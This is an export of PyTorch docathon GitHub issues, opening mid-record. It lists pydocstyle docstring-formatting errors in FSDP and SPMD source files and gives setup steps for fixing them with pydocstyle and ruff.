- **Error Code**: **D202**, **File**: `torch/distributed/_spmd/graph_optimization.py`, **Entity**: `find_all_descendants`, **Line**: 984, **Description**: No blank lines allowed after function docstring (found 1)
- **Error Code**: **D400**, **File**: `torch/distributed/_spmd/graph_optimization.py`, **Entity**: `find_all_descendants`, **Line**: 984, **Description**: First line should end with a period (not 'n')
- **Error Code**: **D401**, **File**: `torch/distributed/_spmd/graph_optimization.py`, **Entity**: `find_all_descendants`, **Line**: 984, **Description**: First line should be in imperative mood (perhaps 'Identify', not 'identifying')
- **Error Code**: **D403**, **File**: `torch/distributed/_spmd/graph_optimization.py`, **Entity**: `find_all_descendants`, **Line**: 984, **Description**: First word of the first line should be properly capitalized ('Identifying', not 'identifying')

cc @carljparker",False
"Fix docstring errors in _init_utils.py, flat_param.py module: docs triaged medium docathon-h2-2023","Please fix the following issues.
First, make sure to install the required tools:
```
pip3 install pydocstyle
```
```
pip3 install ruff
```
Then complete the followings steps:
 1. Run `pydocstyle` to see the number of errors in the file: 
 ```
pydocstyle path-to-file --count
```
 &nbsp; &nbsp; This command prints out the number of errors at the end of the output. Save this output to later add it to your PR description.
2. Next, run `ruff` which should help autofix many of these errors:
```
ruff --select RULECODE --fix path_to_file
```
&nbsp; &nbsp; `RULECODE` is the error code from the output in the issue, for example, **D200**. See the complete list of rules and autofixes [here](https://docs.astral.sh/ruff/rules/#pydocstyle-d).
3. You can run the above command with the `--unsafe-fixes` option. Double-check that the applied fixes are correct.
4. Fix the remaining issues. Fix **only** the errors listed in the issue. Skip the 'Missing docstrings' errors.
5. Run pydocstyle again:
```
pydocstyle path-to-file --count
```
This **number might not be 0** which is **OK**. Add the count of fixed errors to your PR description. 
- **Error Code**: **D205**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `FlatParameter`, **Line**: 188, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `FlatParameter`, **Line**: 188, **Description**: First line should end with a period (not 's')
- **Error Code**: **D205**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `_init_metadata`, **Line**: 359, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `_init_metadata`, **Line**: 359, **Description**: First line should end with a period (not 's')
- **Error Code**: **D401**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `_init_metadata`, **Line**: 359, **Description**: First line should be in imperative mood (perhaps 'Initialize', not 'Initializes')
- **Error Code**: **D205**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `FlatParamHandle`, **Line**: 425, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `FlatParamHandle`, **Line**: 425, **Description**: First line should end with a period (not 's')
- **Error Code**: **D205**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `_init_flat_param_and_metadata`, **Line**: 546, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `_init_flat_param_and_metadata`, **Line**: 546, **Description**: First line should end with a period (not 'h')
- **Error Code**: **D200**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `_validate_tensors_to_flatten`, **Line**: 687, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **Error Code**: **D401**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `_validate_tensors_to_flatten`, **Line**: 687, **Description**: First line should be in imperative mood (perhaps 'Validate', not 'Validates')
- **Error Code**: **D205**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `flatten_tensors`, **Line**: 730, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `flatten_tensors`, **Line**: 730, **Description**: First line should end with a period (not 'g')
- **Error Code**: **D205**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `_init_param_reduce_dtypes`, **Line**: 787, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `_init_param_reduce_dtypes`, **Line**: 787, **Description**: First line should end with a period (not 's')
- **Error Code**: **D205**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `shard`, **Line**: 820, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `shard`, **Line**: 820, **Description**: First line should end with a period (not 'r')
- **Error Code**: **D205**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `_init_shard_metadata`, **Line**: 855, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `_init_shard_metadata`, **Line**: 855, **Description**: First line should end with a period (not 't')
- **Error Code**: **D401**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `_init_shard_metadata`, **Line**: 855, **Description**: First line should be in imperative mood (perhaps 'Initialize', not 'Initializes')
- **Error Code**: **D205**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `_get_shard_metadata`, **Line**: 897, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `_get_shard_metadata`, **Line**: 897, **Description**: First line should end with a period (not 'd')
- **Error Code**: **D401**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `_get_shard_metadata`, **Line**: 897, **Description**: First line should be in imperative mood (perhaps 'Compute', not 'Computes')
- **Error Code**: **D205**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `_get_unpadded_shard`, **Line**: 960, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `_get_unpadded_shard`, **Line**: 960, **Description**: First line should end with a period (not 'n')
- **Error Code**: **D401**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `_get_unpadded_shard`, **Line**: 960, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **Error Code**: **D205**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `_get_shard`, **Line**: 987, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `_get_shard`, **Line**: 987, **Description**: First line should end with a period (not 'd')
- **Error Code**: **D401**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `_get_shard`, **Line**: 987, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **Error Code**: **D205**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `_get_sharded_size`, **Line**: 1004, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `_get_sharded_size`, **Line**: 1004, **Description**: First line should end with a period (not 's')
- **Error Code**: **D401**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `_get_sharded_size`, **Line**: 1004, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **Error Code**: **D205**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `_get_flat_param_offsets`, **Line**: 1018, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `_get_flat_param_offsets`, **Line**: 1018, **Description**: First line should end with a period (not 'd')
- **Error Code**: **D401**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `_get_flat_param_offsets`, **Line**: 1018, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **Error Code**: **D205**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `shard_metadata`, **Line**: 1033, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `shard_metadata`, **Line**: 1033, **Description**: First line should end with a period (not 'e')
- **Error Code**: **D401**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `shard_metadata`, **Line**: 1033, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **Error Code**: **D205**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `init_flat_param_attributes`, **Line**: 1070, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D401**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `init_flat_param_attributes`, **Line**: 1070, **Description**: First line should be in imperative mood; try rephrasing (found 'This')
- **Error Code**: **D401**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `pre_unshard`, **Line**: 1156, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **Error Code**: **D205**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `_use_low_precision_shard`, **Line**: 1183, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `_use_low_precision_shard`, **Line**: 1183, **Description**: First line should end with a period (not 'd')
- **Error Code**: **D205**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `unshard`, **Line**: 1202, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `unshard`, **Line**: 1202, **Description**: First line should end with a period (not 'r')
- **Error Code**: **D401**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `unshard`, **Line**: 1202, **Description**: First line should be in imperative mood (perhaps 'Run', not 'Runs')
- **Error Code**: **D401**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `needs_unshard`, **Line**: 1226, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **Error Code**: **D205**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `_alloc_padded_unsharded_flat_param`, **Line**: 1237, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `_alloc_padded_unsharded_flat_param`, **Line**: 1237, **Description**: First line should end with a period (not 'd')
- **Error Code**: **D205**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `_get_padded_unsharded_flat_param`, **Line**: 1251, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `_get_padded_unsharded_flat_param`, **Line**: 1251, **Description**: First line should end with a period (not 'n')
- **Error Code**: **D401**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `_get_padded_unsharded_flat_param`, **Line**: 1251, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **Error Code**: **D205**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `_all_gather_flat_param`, **Line**: 1275, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `_all_gather_flat_param`, **Line**: 1275, **Description**: First line should end with a period (not 'n')
- **Error Code**: **D205**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `_use_unsharded_flat_param`, **Line**: 1313, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `_use_unsharded_flat_param`, **Line**: 1313, **Description**: First line should end with a period (not 'a')
- **Error Code**: **D205**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `post_unshard`, **Line**: 1342, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `post_unshard`, **Line**: 1342, **Description**: First line should end with a period (not 'n')
- **Error Code**: **D401**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `post_unshard`, **Line**: 1342, **Description**: First line should be in imperative mood (perhaps 'Run', not 'Runs')
- **Error Code**: **D205**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `unshard_grad`, **Line**: 1367, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `unshard_grad`, **Line**: 1367, **Description**: First line should end with a period (not 'e')
- **Error Code**: **D205**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `prepare_gradient_for_backward`, **Line**: 1429, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `prepare_gradient_for_backward`, **Line**: 1429, **Description**: First line should end with a period (not 'd')
- **Error Code**: **D401**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `prepare_gradient_for_backward`, **Line**: 1429, **Description**: First line should be in imperative mood (perhaps 'Prepare', not 'Prepares')
- **Error Code**: **D205**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `prepare_gradient_for_optim`, **Line**: 1494, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `prepare_gradient_for_optim`, **Line**: 1494, **Description**: First line should end with a period (not 'd')
- **Error Code**: **D401**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `prepare_gradient_for_optim`, **Line**: 1494, **Description**: First line should be in imperative mood (perhaps 'Prepare', not 'Prepares')
- **Error Code**: **D205**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `to_cpu`, **Line**: 1540, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `to_cpu`, **Line**: 1540, **Description**: First line should end with a period (not 't')
- **Error Code**: **D401**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `to_cpu`, **Line**: 1540, **Description**: First line should be in imperative mood (perhaps 'Move', not 'Moves')
- **Error Code**: **D205**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `reshard`, **Line**: 1587, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `reshard`, **Line**: 1587, **Description**: First line should end with a period (not 't')
- **Error Code**: **D401**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `reshard`, **Line**: 1587, **Description**: First line should be in imperative mood (perhaps 'Run', not 'Runs')
- **Error Code**: **D205**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `post_reshard`, **Line**: 1603, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `post_reshard`, **Line**: 1603, **Description**: First line should end with a period (not 't')
- **Error Code**: **D401**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `post_reshard`, **Line**: 1603, **Description**: First line should be in imperative mood (perhaps 'Run', not 'Runs')
- **Error Code**: **D205**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `_free_unsharded_flat_param`, **Line**: 1622, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `_free_unsharded_flat_param`, **Line**: 1622, **Description**: First line should end with a period (not 's')
- **Error Code**: **D205**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `_get_unflat_views_unaligned`, **Line**: 1688, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `_get_unflat_views_unaligned`, **Line**: 1688, **Description**: First line should end with a period (not 't')
- **Error Code**: **D401**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `_get_unflat_views_unaligned`, **Line**: 1688, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **Error Code**: **D205**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `_get_unflat_views_aligned`, **Line**: 1714, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `_get_unflat_views_aligned`, **Line**: 1714, **Description**: First line should end with a period (not '`')
- **Error Code**: **D401**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `_get_unflat_views_aligned`, **Line**: 1714, **Description**: First line should be in imperative mood; try rephrasing (found 'This')
- **Error Code**: **D205**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `_use_unsharded_views`, **Line**: 1741, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `_use_unsharded_views`, **Line**: 1741, **Description**: First line should end with a period (not 'l')
- **Error Code**: **D205**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `_use_unsharded_grad_views`, **Line**: 1820, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `_use_unsharded_grad_views`, **Line**: 1820, **Description**: First line should end with a period (not 'e')
- **Error Code**: **D205**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `unflatten_as_params`, **Line**: 1888, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `unflatten_as_params`, **Line**: 1888, **Description**: First line should end with a period (not ',')
- **Error Code**: **D205**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `_use_sharded_views`, **Line**: 1903, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `_use_sharded_views`, **Line**: 1903, **Description**: First line should end with a period (not 'o')
- **Error Code**: **D401**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `_use_sharded_views`, **Line**: 1903, **Description**: First line should be in imperative mood (perhaps 'Set', not 'Sets')
- **Error Code**: **D205**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `_use_sharded_grad_views`, **Line**: 1958, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `_use_sharded_grad_views`, **Line**: 1958, **Description**: First line should end with a period (not 'd')
- **Error Code**: **D401**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `_use_sharded_grad_views`, **Line**: 1958, **Description**: First line should be in imperative mood (perhaps 'Set', not 'Sets')
- **Error Code**: **D205**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `_writeback_orig_params`, **Line**: 2018, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `_writeback_orig_params`, **Line**: 2018, **Description**: First line should end with a period (not 's')
- **Error Code**: **D401**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `_writeback_orig_params`, **Line**: 2018, **Description**: First line should be in imperative mood (perhaps 'Iterate', not 'Iterates')
- **Error Code**: **D205**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `_writeback_tensor`, **Line**: 2176, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `_writeback_tensor`, **Line**: 2176, **Description**: First line should end with a period (not ',')
- **Error Code**: **D401**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `_writeback_tensor`, **Line**: 2176, **Description**: First line should be in imperative mood (perhaps 'Write', not 'Writes')
- **Error Code**: **D205**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `_clear_grads_if_needed`, **Line**: 2218, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `_clear_grads_if_needed`, **Line**: 2218, **Description**: First line should end with a period (not '`')
- **Error Code**: **D401**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `flat_param_to`, **Line**: 2245, **Description**: First line should be in imperative mood (perhaps 'Wrap', not 'Wraps')
- **Error Code**: **D205**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `_get_modules`, **Line**: 2255, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `_get_modules`, **Line**: 2255, **Description**: First line should end with a period (not 'd')
- **Error Code**: **D401**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `_get_modules`, **Line**: 2255, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **Error Code**: **D205**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `is_sharded`, **Line**: 2264, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `is_sharded`, **Line**: 2264, **Description**: First line should end with a period (not 'e')
- **Error Code**: **D401**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `is_sharded`, **Line**: 2264, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **Error Code**: **D205**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `_reset_is_grad_none`, **Line**: 2350, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `_reset_is_grad_none`, **Line**: 2350, **Description**: First line should end with a period (not 'e')
- **Error Code**: **D401**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `_reset_is_grad_none`, **Line**: 2350, **Description**: First line should be in imperative mood (perhaps 'Reset', not 'Resets')
- **Error Code**: **D205**, **File**: `torch/distributed/fsdp/_init_utils.py`, **Entity**: `_init_intra_node_process_group`, **Line**: 174, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D401**, **File**: `torch/distributed/fsdp/_init_utils.py`, **Entity**: `_init_intra_node_process_group`, **Line**: 174, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **Error Code**: **D205**, **File**: `torch/distributed/fsdp/_init_utils.py`, **Entity**: `_init_inter_node_process_group`, **Line**: 192, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/fsdp/_init_utils.py`, **Entity**: `_init_inter_node_process_group`, **Line**: 192, **Description**: First line should end with a period (not 's')
- **Error Code**: **D401**, **File**: `torch/distributed/fsdp/_init_utils.py`, **Entity**: `_init_inter_node_process_group`, **Line**: 192, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **Error Code**: **D205**, **File**: `torch/distributed/fsdp/_init_utils.py`, **Entity**: `_init_intra_and_inter_node_groups`, **Line**: 227, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/fsdp/_init_utils.py`, **Entity**: `_init_intra_and_inter_node_groups`, **Line**: 227, **Description**: First line should end with a period (not 'g')
- **Error Code**: **D401**, **File**: `torch/distributed/fsdp/_init_utils.py`, **Entity**: `_init_intra_and_inter_node_groups`, **Line**: 227, **Description**: First line should be in imperative mood (perhaps 'Initialize', not 'Initializes')
- **Error Code**: **D205**, **File**: `torch/distributed/fsdp/_init_utils.py`, **Entity**: `_init_device_handle`, **Line**: 283, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/fsdp/_init_utils.py`, **Entity**: `_init_device_handle`, **Line**: 283, **Description**: First line should end with a period (not ',')
- **Error Code**: **D401**, **File**: `torch/distributed/fsdp/_init_utils.py`, **Entity**: `_init_device_handle`, **Line**: 283, **Description**: First line should be in imperative mood (perhaps 'Determine', not 'Determines')
- **Error Code**: **D205**, **File**: `torch/distributed/fsdp/_init_utils.py`, **Entity**: `_init_param_handle_from_module`, **Line**: 452, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D401**, **File**: `torch/distributed/fsdp/_init_utils.py`, **Entity**: `_init_param_handle_from_module`, **Line**: 452, **Description**: First line should be in imperative mood (perhaps 'Initialize', not 'Initializes')
- **Error Code**: **D205**, **File**: `torch/distributed/fsdp/_init_utils.py`, **Entity**: `_init_param_handles_from_module`, **Line**: 499, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/fsdp/_init_utils.py`, **Entity**: `_init_param_handles_from_module`, **Line**: 499, **Description**: First line should end with a period (not 's')
- **Error Code**: **D401**, **File**: `torch/distributed/fsdp/_init_utils.py`, **Entity**: `_init_param_handles_from_module`, **Line**: 499, **Description**: First line should be in imperative mood (perhaps 'Initialize', not 'Initializes')
- **Error Code**: **D205**, **File**: `torch/distributed/fsdp/_init_utils.py`, **Entity**: `_get_state_names_for_states`, **Line**: 616, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/fsdp/_init_utils.py`, **Entity**: `_get_state_names_for_states`, **Line**: 616, **Description**: First line should end with a period (not 'd')
- **Error Code**: **D401**, **File**: `torch/distributed/fsdp/_init_utils.py`, **Entity**: `_get_state_names_for_states`, **Line**: 616, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **Error Code**: **D205**, **File**: `torch/distributed/fsdp/_init_utils.py`, **Entity**: `_get_ignored_modules`, **Line**: 647, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/fsdp/_init_utils.py`, **Entity**: `_get_ignored_modules`, **Line**: 647, **Description**: First line should end with a period (not 't')
- **Error Code**: **D401**, **File**: `torch/distributed/fsdp/_init_utils.py`, **Entity**: `_get_ignored_modules`, **Line**: 647, **Description**: First line should be in imperative mood (perhaps 'Check', not 'Checks')
- **Error Code**: **D205**, **File**: `torch/distributed/fsdp/_init_utils.py`, **Entity**: `_get_ignored_params`, **Line**: 704, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/fsdp/_init_utils.py`, **Entity**: `_get_ignored_params`, **Line**: 704, **Description**: First line should end with a period (not 'd')
- **Error Code**: **D401**, **File**: `torch/distributed/fsdp/_init_utils.py`, **Entity**: `_get_ignored_params`, **Line**: 704, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **Error Code**: **D205**, **File**: `torch/distributed/fsdp/_init_utils.py`, **Entity**: `_get_buffer_names`, **Line**: 733, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/fsdp/_init_utils.py`, **Entity**: `_get_buffer_names`, **Line**: 733, **Description**: First line should end with a period (not 'y')
- **Error Code**: **D401**, **File**: `torch/distributed/fsdp/_init_utils.py`, **Entity**: `_get_buffer_names`, **Line**: 733, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **Error Code**: **D205**, **File**: `torch/distributed/fsdp/_init_utils.py`, **Entity**: `_check_single_device_module`, **Line**: 746, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/fsdp/_init_utils.py`, **Entity**: `_check_single_device_module`, **Line**: 746, **Description**: First line should end with a period (not ',')
- **Error Code**: **D401**, **File**: `torch/distributed/fsdp/_init_utils.py`, **Entity**: `_check_single_device_module`, **Line**: 746, **Description**: First line should be in imperative mood (perhaps 'Raise', not 'Raises')
- **Error Code**: **D205**, **File**: `torch/distributed/fsdp/_init_utils.py`, **Entity**: `_get_device_from_device_id`, **Line**: 762, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/fsdp/_init_utils.py`, **Entity**: `_get_device_from_device_id`, **Line**: 762, **Description**: First line should end with a period (not 'r')
- **Error Code**: **D401**, **File**: `torch/distributed/fsdp/_init_utils.py`, **Entity**: `_get_device_from_device_id`, **Line**: 762, **Description**: First line should be in imperative mood (perhaps 'Process', not 'Processes')
- **Error Code**: **D205**, **File**: `torch/distributed/fsdp/_init_utils.py`, **Entity**: `_need_to_materialize_module`, **Line**: 788, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/fsdp/_init_utils.py`, **Entity**: `_need_to_materialize_module`, **Line**: 788, **Description**: First line should end with a period (not 's')
- **Error Code**: **D401**, **File**: `torch/distributed/fsdp/_init_utils.py`, **Entity**: `_need_to_materialize_module`, **Line**: 788, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **Error Code**: **D205**, **File**: `torch/distributed/fsdp/_init_utils.py`, **Entity**: `_move_module_to_device`, **Line**: 841, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/fsdp/_init_utils.py`, **Entity**: `_move_module_to_device`, **Line**: 841, **Description**: First line should end with a period (not 't')
- **Error Code**: **D401**, **File**: `torch/distributed/fsdp/_init_utils.py`, **Entity**: `_move_module_to_device`, **Line**: 841, **Description**: First line should be in imperative mood (perhaps 'Move', not 'Moves')
- **Error Code**: **D205**, **File**: `torch/distributed/fsdp/_init_utils.py`, **Entity**: `_move_states_to_device`, **Line**: 894, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/fsdp/_init_utils.py`, **Entity**: `_move_states_to_device`, **Line**: 894, **Description**: First line should end with a period (not 'd')
- **Error Code**: **D205**, **File**: `torch/distributed/fsdp/_init_utils.py`, **Entity**: `_get_compute_device`, **Line**: 936, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/fsdp/_init_utils.py`, **Entity**: `_get_compute_device`, **Line**: 936, **Description**: First line should end with a period (not 's')
